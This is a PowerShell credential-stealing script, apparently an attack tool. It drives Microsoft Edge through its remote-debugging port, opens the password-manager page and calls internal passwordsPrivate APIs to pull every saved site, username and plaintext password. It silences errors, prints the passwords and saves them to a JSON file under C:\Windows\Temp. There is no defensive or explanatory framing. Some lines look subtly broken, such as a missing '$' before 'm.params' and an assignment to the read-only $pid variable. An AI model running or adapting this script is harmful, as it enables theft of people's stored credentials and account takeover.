$ErrorActionPreference = 'SilentlyContinue'

# ═══ 1. Get CDP targets, find/create password manager tab ═══
$targets = (irm http://127.0.0.1:9222/json/list) | ConvertFrom-Json
$pm = $targets | Where-Object { $_.url -match 'password-manager' } | Select-Object -First 1
if (-not $pm) {
    Write-Output "[*] creating password manager tab..."
    $new = (irm "http://127.0.0.1:9222/json/new?url=edge://password-manager/passwords") | ConvertFrom-Json
    Start-Sleep 5
    $targets = (irm http://127.0.0.1:9222/json/list) | ConvertFrom-Json
    $pm = $targets | Where-Object { $_.url -match 'password-manager' } | Select-Object -First 1
}
if (-not $pm) { Write-Output "FAIL: no password manager tab"; exit }
$wsUrl = $pm.webSocketDebuggerUrl
Write-Output "[*] target: $wsUrl"

# ═══ 2. Connect to the page's WebSocket ═══
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ct = [System.Threading.CancellationToken]::None
$ws.ConnectAsync([Uri]$wsUrl, $ct).Wait()
Write-Output "[*] connected: $($ws.State)"

$buf = [byte[]]::new(10485760)

function Send-Cdp([int]$Id, [string]$Method, [object]$Params) {
    $m = @{ id = $Id; method = $Method }
    if ($Params) { m.params = $Params }
    $json = ConvertTo-Json -Compress -InputObject $m -Depth 5
    $b = [System.Text.Encoding]::UTF8.GetBytes($json)
    $s = [ArraySegment[byte]]::new($b)
    $ws.SendAsync($s, 'Text', $true, $ct).Wait()
    $s2 = [ArraySegment[byte]]::new($buf)
    $r = $ws.ReceiveAsync($s2, $ct).Result
    return [System.Text.Encoding]::UTF8.GetString($buf, 0, $r.Count)
}

# ═══ 3. Wait for page load ═══
Start-Sleep 5

# ═══ 4. Evaluate chrome.passwordsPrivate.getSavedPasswordList ═══
Write-Output "[*] getting saved password list..."
$resp = Send-Cdp 1 "Runtime.evaluate" @{
    expression = 'new Promise(resolve => chrome.passwordsPrivate.getSavedPasswordList(l => resolve(JSON.stringify(l))))'
    awaitPromise = $true
    returnByValue = $true
}
$listJson = ($resp | ConvertFrom-Json).result.result.value
Write-Output "[*] response: $($listJson.Substring(0, [Math]::Min(200, $listJson.Length)))"

$passwordList = $listJson | ConvertFrom-Json
Write-Output "[+] found $($passwordList.Count) saved passwords"

# ═══ 5. Extract each password ═══
$allPasswords = @()
$id = 10
foreach ($entry in $passwordList) {
    $pid = $entry.id
    $url = $entry.urls.origin
    $user = $entry.username

    Write-Output "[*] extracting password for $url ($user)..."

    $evalJs = "new Promise(resolve => chrome.passwordsPrivate.getPlaintextPassword($pid, pw => resolve(JSON.stringify({url:'$url',user:'$user',password:pw}))))"
    $resp2 = Send-Cdp $id "Runtime.evaluate" @{
        expression = $evalJs
        awaitPromise = $true
        returnByValue = $true
    }
    $id++

    $pwJson = ($resp2 | ConvertFrom-Json).result.result.value
    if ($pwJson) {
        $pwData = $pwJson | ConvertFrom-Json
        $allPasswords += $pwData
        Write-Output "  -> $url | $user | $($pwData.password)"
    } else {
        # Try to extract from the raw response
        Write-Output "  -> raw: $($resp2.Substring(0, [Math]::Min(200, $resp2.Length)))"
    }
}

# ═══ 6. Save results ═══
$out = $allPasswords | ConvertTo-Json -Depth 3
$out | Out-File "C:\Windows\Temp\ziti\passwords_extracted.json" -Encoding utf8
Write-Output ""
Write-Output "[+] saved $($allPasswords.Count) passwords to C:\Windows\Temp\ziti\passwords_extracted.json"

# Also output as readable text
Write-Output ""
Write-Output "=== ALL PASSWORDS ==="
foreach ($p in $allPasswords) {
    Write-Output "$($p.url) | $($p.user) | $($p.password)"
}

$ws.Dispose()